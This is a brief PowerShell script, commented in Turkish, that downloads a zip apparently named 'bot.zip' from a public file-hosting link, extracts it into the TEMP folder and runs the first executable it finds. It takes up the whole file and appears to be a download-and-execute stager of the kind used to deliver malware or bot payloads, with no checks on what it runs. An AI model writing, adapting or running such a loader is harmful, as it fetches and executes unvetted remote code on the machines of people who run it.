$zipUrl = "https://store-eu-par-3.gofile.io/download/web/9ce7760f-8dde-4764-afef-2dac1a25933c/bot.zip"   # <- buraya direkt linki yaz
$zipPath = "$env:TEMP\indirilen.zip"
$extractPath = "$env:TEMP\zipCikartilan"

# ZIP dosyasını indir
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

# Çıkarma klasörünü oluştur
New-Item -ItemType Directory -Force -Path $extractPath | Out-Null

# ZIP dosyasını çıkar
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

# EXE dosyasını bul ve çalıştır
$exe = Get-ChildItem -Path $extractPath -Filter *.exe -Recurse | Select-Object -First 1
Start-Process -FilePath $exe.FullName
